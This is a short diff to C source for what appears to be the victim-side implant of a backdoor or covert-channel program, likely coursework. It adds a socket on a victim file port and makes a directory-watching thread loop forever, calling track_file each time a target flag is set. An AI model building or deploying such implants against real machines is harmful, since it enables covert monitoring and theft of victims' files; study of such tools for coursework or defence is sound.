@@ -20,6 +20,7 @@ int main(int argc, char *argv[]) {
     options_victim_init(&opts);
     create_socket(&opts, 'V', 'U', opts.dest_ip, ATC_UDP_PORT);
     create_socket(&opts, 'V', 'T', opts.dest_ip, ATC_TCP_PORT);
+    create_socket(&opts, 'V', 'R', opts.my_ip, VIC_FILE_PORT);
     puts("============ Initialize VICTIM ============");
     fflush(stdout);
 
@@ -338,11 +339,12 @@ void* check_directory(void* arg) {
 
     ov = (struct options_victim*) arg;
     while(1) {
-        if (ov->target == TRUE) {
-            break;
+        while(1) {
+            if (ov->target == TRUE) {
+                break;
+            }
         }
+        track_file(ov);
+        ov->target = FALSE;
     }
-    track_file(ov);
-    ov->target = FALSE;
-    return NULL;
 }
